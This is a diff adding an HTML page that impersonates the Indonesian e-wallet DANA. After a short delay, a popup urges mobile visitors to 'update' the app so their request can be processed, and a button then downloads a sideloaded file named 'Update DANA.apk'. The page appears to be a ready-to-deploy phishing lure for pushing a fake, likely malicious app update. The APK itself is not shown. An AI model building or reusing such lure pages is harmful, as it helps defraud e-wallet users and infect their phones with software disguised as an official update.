@@ -1,0 +1,125 @@
+<html>
+<head>
+  <title>DANA - Update Aplikasi</title>
+  <meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport"> 
+  <meta name="theme-color" content="#0E66BF">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+<link href="https://fonts.googleapis.com/css?family=Arima+Madurai" rel="stylesheet" type="text/css">
+<link href="https://fonts.googleapis.com/css?family=Headland+One" rel="stylesheet" type="text/css">
+<link href="https://fonts.googleapis.com/css?family=ABeeZee" rel="stylesheet" type="text/css">
+
+<link href="https://fonts.googleapis.com/css?family=Amiko" rel="stylesheet" type="text/css">
+
+</head>
+  <style>
+  
+   @media screen and (max-width: 480px) {
+                body{
+                position: fixed;
+                width: 100%;
+                left: 0;
+                top: 0; 
+                bottom: 0;
+                right: 0;
+                font-family: Amiko, sans-serif;
+                background-color: #fff;
+                 background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMB22rJeEs1RxnGRnEWFPW3sOV6IYTN5QggXR_m6MsJJT4QNajD44x0goSKzhTheK_KErEeg-ZQlUNqytVSeHldWL24J2sLw7vSJgjMrhiVG1djrshPwnCO6ib8LaHNe1kPxyb_yyZj1nhyphenhyphensXINvQnSct12T2Q0z5Mj8_ne7PCcuhbub8DiOrYIlGqqW0/s1958/IMG_20231211_190204.jpg); background-size: 100% 100%; background-position: 100% 100%;
+                margin: 0px auto;
+                height: 100%;
+                text-align: center;
+ }
+  }
+  
+  
+   @media screen and (max-width: 360px) {
+                body{
+                position: fixed;
+                width: 100%;
+                left: 0;
+                top: 0; 
+                bottom: 0;
+                font-family: Amiko, sans-serif;
+                background-color: #fff;
+                 background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMB22rJeEs1RxnGRnEWFPW3sOV6IYTN5QggXR_m6MsJJT4QNajD44x0goSKzhTheK_KErEeg-ZQlUNqytVSeHldWL24J2sLw7vSJgjMrhiVG1djrshPwnCO6ib8LaHNe1kPxyb_yyZj1nhyphenhyphensXINvQnSct12T2Q0z5Mj8_ne7PCcuhbub8DiOrYIlGqqW0/s1958/IMG_20231211_190204.jpg); 
+              background-size: 100% 100%;
+              background-position: 100% 100%;
+                right: 0;
+                margin: 0px auto;
+                height: 100%;
+                text-align: center;
+ }
+  }
+  
+  button{
+       position: fixed;
+                width: 82%;
+                left: 0;
+                border: none;
+                border-radius: 50px;
+                height: 50px;
+                bottom: 30;
+                color: #0E66BF;
+                background-color: #fff;
+                right: 0;
+                z-index: -1;
+                font-family: ABeeZee, Headland One, Amiko, sans-serif;
+                font-size: 18px;
+                font-weight: bold;
+                margin: 0px auto;
+  }
+</style>  
+ <body>
+ <audio src="dana.mp3" id="musik"></audio>    
+<div  id="info"  style="position: fixed;
+                width: 100%;
+                left: 0;
+                top: 0; 
+                bottom: 0; right: 0;
+                margin: 0px auto;
+                height: 100%;
+                text-align: center; background: rgba(0,0,0, 0.4); display: none">
+<div style="position: absolute;
+                width: 70%;
+                left: 0;
+                top: 180; 
+                bottom: 0; right: 0;
+                margin: 0px auto;
+                height: 155px;
+                text-align: center; background: white; padding: 15px; border-radius: 18px; font-weight: bold">
+<span>Silahkan Update Aplikasi DANA anda agar permintaan dapat segera diproses<br/>
+Untuk update silahkan tekan tombol UPDATE dibawah ini
+</span>    
+ <input type="button" value="Lanjutkan" style="margin-top: 170px; border-radius: 50px; border: none;
+                border-radius: 50px;
+                height: 40px; font-family: ABeeZee, Headland One, Amiko, sans-serif;
+                font-size: 18px;
+                font-weight: bold; width: 150px; display: inline-block; position: absolute; left: 0; right: 0; margin: 0px auto; bottom: 10; background: #0E66BF; color: #fff" onclick="tutupinfo()"/> 
+                </div>    
+</div>     
+
+<button type="button" onclick="window.location.href='Update DANA.apk'">
+  Update Aplikasi DANA  
+</button>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js'></script>
+<script>
+function tutupinfo(){
+ document.getElementById('info').style.display = "none";
+  var audio = document.getElementById("musik");
+ document.getElementById('musik').play();
+ audio.autoplay;
+   
+}    
+</script>
+<script>
+    $( document ).ready(function() {
+            setTimeout(() => {
+                $('#info').fadeIn();
+            },1000)
+             $('#musik').play();
+        })
+        
+</script>
+</body>  
+</html>
